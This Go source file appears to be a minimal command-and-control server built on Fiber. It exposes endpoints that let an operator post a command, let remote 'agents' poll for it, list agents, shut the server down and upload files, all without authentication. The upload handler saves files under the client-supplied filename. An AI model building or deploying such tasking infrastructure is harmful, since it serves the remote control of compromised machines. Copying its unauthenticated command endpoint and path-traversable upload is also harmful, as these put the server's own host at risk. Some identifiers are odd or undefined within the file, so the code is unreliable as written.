package fiber

import (
	"CSControlServer/types"
	"fmt"
	"github.com/gofiber/fiber/v2"
)

var allagents types.Client

func InitServer() {
	responsecmd := "01"
	app := fiber.New()

	app.Post("/", func(ctx *fiber.Ctx) error {
		file, _ := ctx.FormFile("./public/index.html")
		return ctx.SaveFile(file, fmt.Sprintf("./%s", file.Filename))
	})
	app.Get("/getcmd", func(ctx *fiber.Ctx) error {
		return ctx.SendString(responsecmd)
	})

	app.Get("/postcmd", func(ctx *fiber.Ctx) error {
		responsecmd = ctx.FormValue("command")
		return ctx.SendString(responsecmd)
	})

	app.Get("/shutdown", func(ctx *fiber.Ctx) error {
		return app.Shutdown()
	})
	app.Get("/getagents", func(ctx *fiber.Ctx) error {
		return ctx.SendString(MakeAgentsInfoCompact())
	})
	app.Get("/getdebug", func(ctx *fiber.Ctx) error {
		return ctx.SendString(debug)
	})

	err := app.Listen(":80")
	if err != nil {
		return
	}

}
